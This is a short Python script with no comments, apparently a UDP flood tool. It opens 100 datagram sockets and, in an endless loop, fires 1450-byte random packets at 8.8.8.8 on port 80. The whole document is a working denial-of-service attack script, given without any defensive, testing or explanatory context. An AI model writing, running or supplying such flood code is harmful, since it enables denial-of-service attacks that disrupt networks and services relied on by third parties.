import random
import socket

packet = random._urandom(1450)
socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(100)]

while True:
    for sock in socks:
        sock.sendto(packet, ('8.8.8.8', 80))
